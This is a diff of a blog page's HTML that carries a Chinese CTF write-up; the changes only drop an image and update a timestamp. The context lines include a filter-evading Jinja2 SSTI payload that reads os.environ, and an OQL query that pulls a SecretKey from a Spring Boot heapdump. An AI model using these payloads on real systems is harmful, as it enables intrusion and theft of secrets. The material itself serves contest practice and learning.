@@ -13,14 +13,12 @@
 <meta property="og:site_name" content="Trashbox 4 outx!">
 <meta property="og:description" content="难得重新开始打比赛，从校赛开始复健练习   简简单单记录下  Webcheckin赛题源码 12345678910111213141516171819202122&lt;?phperror_reporting(0);$action &#x3D; $_GET[&amp;#x27;a&amp;#x27;]?$_GET[&amp;#x27;a&amp;#x27;]:highlight_file(__FILE__);if($action&#x3D;&#x3D;&#x3D;&amp;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220523170215663.png">
 <meta property="article:published_time" content="2022-05-23T02:39:40.000Z">
-<meta property="article:modified_time" content="2022-05-23T09:10:34.920Z">
+<meta property="article:modified_time" content="2022-05-23T09:14:50.337Z">
 <meta property="article:author" content="outx">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220523170215663.png">
     
     
       
@@ -184,7 +182,6 @@
 <p>登录后，SSTI，过滤了很多</p>
 <p>payload: <code> &#123;&#123;get_flashed_messages[%22__globAls__%22.lower()][%22__buIltins__%22.lower()].__import__(%22os%22)[%22eNviron%22.lower()]&#125;&#125;</code></p>
 <h1 id="RealWorld"><a href="#RealWorld" class="headerlink" title="RealWorld"></a>RealWorld</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>/env信息泄漏</p>
-<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220523170215663.png" alt="image-20220523170215663"></p>
 <p>参考<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%85%B6%E4%B8%AD%E7%9A%84SecretKey%EF%BC%8C%E4%B8%8B%E8%BD%BD/heapdump%EF%BC%8C%E6%89%A7%E8%A1%8COQL%E8%AF%AD%E5%8F%A5">https://github.com/LandGrey/SpringBootVulExploit，获取其中的SecretKey，下载/heapdump，执行OQL语句</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;SecretKey&quot;))</span><br></pre></td></tr></table></figure>
 
